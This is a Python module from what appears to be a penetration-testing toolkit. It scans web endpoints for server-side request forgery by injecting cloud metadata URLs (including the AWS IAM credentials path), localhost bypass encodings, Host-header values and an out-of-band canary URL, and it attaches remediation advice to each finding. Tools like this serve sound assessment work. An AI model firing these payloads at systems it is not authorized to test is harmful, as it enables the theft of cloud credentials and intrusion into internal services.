"""SSRF + OOB Callback Tester — Task 22.1 (Sprint 22).

Detects Server-Side Request Forgery by:
  1. Probing URL/URI parameters with internal/cloud metadata destinations
  2. Detecting Host Header injection → SSRF pivot
  3. OOB: injecting Burp Collaborator (or canary) URL and checking for callback
  4. Detecting open redirects chained to SSRF

Common high-value targets:
  - AWS metadata endpoint (169.254.169.254)
  - GCP metadata (metadata.google.internal)
  - Internal services (localhost, 127.0.0.1, 0.0.0.0, [::1])
  - File:// URI (for local file read escalation)
  - DNS rebinding patterns

Usage:
    from pentra_tools.vuln.ssrf_oob_tester import scan_ssrf_on_endpoints, SsrfFinding

    findings = await scan_ssrf_on_endpoints(
        endpoints=[{"url": "https://target.com/fetch?url=", "method": "GET"}],
        auth_headers={"Authorization": "Bearer token"},
        oob_canary="https://collaborator.example.com/ssrf-test",
    )
"""

from __future__ import annotations

import asyncio
import logging
import re
import urllib.parse
from dataclasses import dataclass

import httpx

logger = logging.getLogger(__name__)


# ── SSRF payload targets ──────────────────────────────────────────────────────

# Internal/cloud destinations that should never be reachable via user-supplied URLs
_SSRF_PAYLOADS: list[tuple[str, str, str]] = [
    # (payload_url, description, expected_indicator)
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1 metadata", "ami-id"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds", "Type"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata", "computeMetadata"),
    ("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata", "id"),
    ("http://localhost:80/", "Localhost HTTP", ""),
    ("http://127.0.0.1:22/", "Localhost SSH port probe", "SSH"),
    ("http://0.0.0.0/", "Null-route SSRF bypass", ""),
    ("http://[::1]/", "IPv6 localhost", ""),
    ("http://2130706433/", "Decimal IP localhost bypass", ""),
    ("http://0177.0.0.1/", "Octal IP localhost bypass", ""),
]

# URL/URI parameter names commonly used for SSRF
_SSRF_PARAM_NAMES = [
    "url", "uri", "src", "href", "dest", "destination", "redirect", "redirect_uri",
    "return_url", "return", "next", "path", "target", "link", "fetch", "load",
    "file", "document", "page", "resource", "endpoint", "proxy", "callback",
    "host", "domain", "origin", "image", "img", "logo", "icon", "avatar",
    "webhook", "notify", "notification_url", "feed", "rss", "xml", "data",
]

# Patterns indicating the server fetched the URL and reflected something back
_SSRF_RESPONSE_INDICATORS = [
    "ami-id", "instance-id", "security-credentials", "iam", "metadata",
    "computeMetadata", "google", "digitalocean",
    "root:", "bin/bash", "etc/passwd",  # LFI escalation
    "ssh", "openssh", "banner",
    "connection refused", "connection reset",  # port probe leakage
    "timeout", "unreachable",  # timing/error leakage
]

# HTTP headers used for Host Header Injection → SSRF
_HOST_INJECTION_HEADERS = [
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Original-URL",
    "X-Rewrite-URL",
    "Forwarded",
]

# Regex: detects SSRF-suggestive content in HTTP responses
_SSRF_INDICATOR_RE = re.compile(
    r"(ami-id|instance-id|169\.254|metadata|computeMetadata|root:x:|ssh-rsa|connection refused)",
    re.IGNORECASE,
)


# ── Data model ────────────────────────────────────────────────────────────────

@dataclass
class SsrfFinding:
    """A confirmed or suspected SSRF finding."""

    title: str
    severity: str            # critical / high / medium
    attack_type: str         # "parameter_injection" | "host_header" | "oob_callback"
    target_url: str
    payload: str
    parameter: str
    evidence: str
    remediation: str

    def to_finding(self) -> dict:
        return {
            "title": self.title,
            "severity": self.severity,
            "vuln_class": "SSRF",
            "target_url": self.target_url,
            "description": (
                f"SSRF via {self.attack_type}: parameter '{self.parameter}' accepted "
                f"internal/OOB URL payload. Evidence: {self.evidence}"
            ),
            "request_raw": f"Payload: {self.payload}\nParameter: {self.parameter}",
            "response_raw": self.evidence[:500] if self.evidence else "",
            "source": "ssrf_oob_tester",
            "remediation": self.remediation,
        }


# ── Parameter extraction ──────────────────────────────────────────────────────

def _extract_ssrf_params(url: str) -> list[str]:
    """Return query parameter names in `url` that may be SSRF targets."""
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return [k for k in params if k.lower() in _SSRF_PARAM_NAMES]
    except Exception:
        return []


def identify_ssrf_candidates(endpoints: list[dict]) -> list[dict]:
    """Filter endpoints to those likely injectable for SSRF.

    Criteria:
      - URL contains a parameter whose name suggests URL/URI input
      - OR method is GET/POST with path patterns like /fetch, /proxy, /redirect

    Returns enriched endpoint list with `ssrf_params` key.
    """
    _PATH_PATTERNS = re.compile(
        r"/(fetch|proxy|redirect|load|download|render|preview|check|ping|validate|link|"
        r"image|img|avatar|logo|url|webhook|callback|rss|feed|xml|resource|document)",
        re.IGNORECASE,
    )

    candidates = []
    for ep in endpoints:
        url = ep.get("url", "")
        if not url:
            continue

        ssrf_params = _extract_ssrf_params(url)
        path_match = _PATH_PATTERNS.search(urllib.parse.urlparse(url).path)

        if ssrf_params or path_match:
            candidates.append({**ep, "ssrf_params": ssrf_params})

    return candidates


# ── Core probing ──────────────────────────────────────────────────────────────

async def _probe_parameter_ssrf(
    client: httpx.AsyncClient,
    url: str,
    param: str,
    payload: str,
    description: str,
    indicator: str,
) -> SsrfFinding | None:
    """Replace `param` value in `url` with `payload` and check the response."""
    try:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        probe_url = parsed._replace(query=new_query).geturl()

        resp = await client.get(probe_url, timeout=8.0)
        body = resp.text

        matched = False
        evidence = ""
        if indicator and indicator.lower() in body.lower():
            matched = True
            evidence = f"Indicator '{indicator}' found in response"
        elif _SSRF_INDICATOR_RE.search(body):
            matched = True
            m = _SSRF_INDICATOR_RE.search(body)
            evidence = f"SSRF indicator '{m.group()}' found in response"
        # Timing-based: very fast (< 50ms) on closed port = SSRF probe reaching internal
        # We skip timing here — that's OOB territory

        if matched:
            return SsrfFinding(
                title=f"SSRF — {description} via parameter '{param}'",
                severity="critical",
                attack_type="parameter_injection",
                target_url=url,
                payload=payload,
                parameter=param,
                evidence=evidence,
                remediation=(
                    "Implement a strict URL allowlist. Reject private/loopback/link-local "
                    "IPs. Use a dedicated egress proxy that blocks internal ranges. "
                    "Never pass user-supplied URLs to server-side HTTP clients."
                ),
            )
    except Exception:
        pass
    return None


async def _probe_host_header_ssrf(
    client: httpx.AsyncClient,
    url: str,
    canary_host: str,
) -> SsrfFinding | None:
    """Inject canary host into Host-injection headers and check for reflection."""
    for header in _HOST_INJECTION_HEADERS:
        try:
            resp = await client.get(url, headers={header: canary_host}, timeout=8.0)
            body = resp.text.lower()
            # Look for canary host reflected in response, Location, or Link headers
            if canary_host.lower() in body:
                return SsrfFinding(
                    title=f"Host Header Injection / SSRF — {header}: {canary_host}",
                    severity="high",
                    attack_type="host_header",
                    target_url=url,
                    payload=canary_host,
                    parameter=header,
                    evidence=f"Canary host '{canary_host}' reflected in response body",
                    remediation=(
                        "Do not use Host/X-Forwarded-Host for server-side requests or "
                        "redirects. Validate Host header against an allowlist of known "
                        "application hostnames."
                    ),
                )
            # Check Location redirect to our canary
            loc = resp.headers.get("Location", "")
            if canary_host.lower() in loc.lower():
                return SsrfFinding(
                    title=f"Open Redirect via Host Header — {header}",
                    severity="high",
                    attack_type="host_header",
                    target_url=url,
                    payload=canary_host,
                    parameter=header,
                    evidence=f"Location: {loc}",
                    remediation=(
                        "Validate redirect destinations against an allowlist. "
                        "Never construct redirect URLs from request headers."
                    ),
                )
        except Exception:
            continue
    return None


async def _probe_oob_ssrf(
    client: httpx.AsyncClient,
    url: str,
    param: str,
    oob_url: str,
) -> SsrfFinding | None:
    """Inject OOB/collaborator URL and check for any interaction indicator.

    In a real engagement this would poll the Burp Collaborator API.
    Here we check if the server returns a 2xx (it fetched our canary) or if
    the response body contains the OOB domain (reflection).
    """
    try:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [oob_url]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        probe_url = parsed._replace(query=new_query).geturl()

        resp = await client.get(probe_url, timeout=10.0)
        oob_domain = urllib.parse.urlparse(oob_url).netloc

        if oob_domain and oob_domain.lower() in resp.text.lower():
            return SsrfFinding(
                title=f"SSRF OOB Reflection — parameter '{param}'",
                severity="critical",
                attack_type="oob_callback",
                target_url=url,
                payload=oob_url,
                parameter=param,
                evidence=f"OOB domain '{oob_domain}' reflected in server response",
                remediation=(
                    "Block outbound connections to non-allowlisted domains. "
                    "Implement egress filtering. Never echo back user-supplied URLs."
                ),
            )
        # 2xx with unusual content-type may indicate server fetched the OOB URL
        if resp.status_code == 200 and "text/html" not in resp.headers.get("Content-Type", ""):
            return SsrfFinding(
                title=f"Potential SSRF OOB — parameter '{param}' (unverified)",
                severity="medium",
                attack_type="oob_callback",
                target_url=url,
                payload=oob_url,
                parameter=param,
                evidence=f"HTTP 200 with Content-Type: {resp.headers.get('Content-Type', 'unknown')} — possible OOB fetch",
                remediation=(
                    "Verify with Burp Collaborator polling. "
                    "Restrict server-side URL fetching to allowlisted destinations."
                ),
            )
    except Exception:
        pass
    return None


# ── Public API ────────────────────────────────────────────────────────────────

async def check_ssrf(
    url: str,
    auth_headers: dict | None = None,
    oob_canary: str | None = None,
    proxy_url: str | None = None,
) -> list[dict]:
    """Test a single endpoint for SSRF via parameter injection and host-header injection.

    Args:
        url:          Target URL (may contain SSRF-prone query parameters).
        auth_headers: Optional authentication headers.
        oob_canary:   Optional OOB/Collaborator URL to use as SSRF payload.
        proxy_url:    Optional HTTP proxy (e.g. Burp Suite).

    Returns:
        List of finding dicts (empty if clean).
    """
    proxy = proxy_url if proxy_url else None
    findings: list[dict] = []

    async with httpx.AsyncClient(
        verify=False,  # noqa: S501
        follow_redirects=False,  # don't follow — we need to see Location headers
        timeout=10.0,
        headers=auth_headers or {},
        **({"proxy": proxy} if proxy else {}),
    ) as client:

        # ── 1. Parameter injection probes ─────────────────────────────────────
        ssrf_params = _extract_ssrf_params(url)
        for param in ssrf_params:
            for payload_url, description, indicator in _SSRF_PAYLOADS[:6]:  # top 6 payloads
                finding = await _probe_parameter_ssrf(
                    client, url, param, payload_url, description, indicator
                )
                if finding:
                    findings.append(finding.to_finding())
                    break  # one confirmed finding per param is enough

            # OOB probe (if canary provided)
            if oob_canary and not any(f["target_url"] == url for f in findings):
                oob_finding = await _probe_oob_ssrf(client, url, param, oob_canary)
                if oob_finding:
                    findings.append(oob_finding.to_finding())

        # ── 2. Host header injection probes ───────────────────────────────────
        canary_host = urllib.parse.urlparse(oob_canary).netloc if oob_canary else "ssrf.pentra.internal"
        host_finding = await _probe_host_header_ssrf(client, url, canary_host)
        if host_finding:
            findings.append(host_finding.to_finding())

    return findings


async def scan_ssrf_on_endpoints(
    endpoints: list[dict],
    auth_headers: dict | None = None,
    oob_canary: str | None = None,
    proxy_url: str | None = None,
    max_endpoints: int = 10,
) -> list[dict]:
    """Scan multiple endpoints for SSRF vulnerabilities concurrently.

    Identifies SSRF-prone candidates first, then probes the top candidates
    with internal/cloud metadata payloads and optional OOB canary URL.

    Args:
        endpoints:      List of endpoint dicts (keys: url, method).
        auth_headers:   Optional authentication headers.
        oob_canary:     Optional OOB/Collaborator URL. If None, skips OOB probes.
        proxy_url:      Optional HTTP proxy.
        max_endpoints:  Maximum number of endpoints to test (default: 10).

    Returns:
        Deduplicated list of finding dicts.
    """
    candidates = identify_ssrf_candidates(endpoints)
    if not candidates:
        logger.debug("[ssrf_oob_tester] No SSRF candidates identified")
        return []

    logger.info("[ssrf_oob_tester] %d SSRF candidate(s) identified, testing top %d",
                len(candidates), min(len(candidates), max_endpoints))

    tasks = [
        check_ssrf(
            url=ep["url"],
            auth_headers=auth_headers,
            oob_canary=oob_canary,
            proxy_url=proxy_url,
        )
        for ep in candidates[:max_endpoints]
    ]

    results = await asyncio.gather(*tasks, return_exceptions=True)

    all_findings: list[dict] = []
    seen: set[str] = set()
    for result in results:
        if isinstance(result, Exception):
            logger.debug("[ssrf_oob_tester] Probe error (non-fatal): %s", result)
            continue
        for finding in result:
            key = f"{finding.get('target_url')}|{finding.get('title')}"
            if key not in seen:
                seen.add(key)
                all_findings.append(finding)

    if all_findings:
        logger.info("[ssrf_oob_tester] %d SSRF finding(s) total", len(all_findings))

    return all_findings
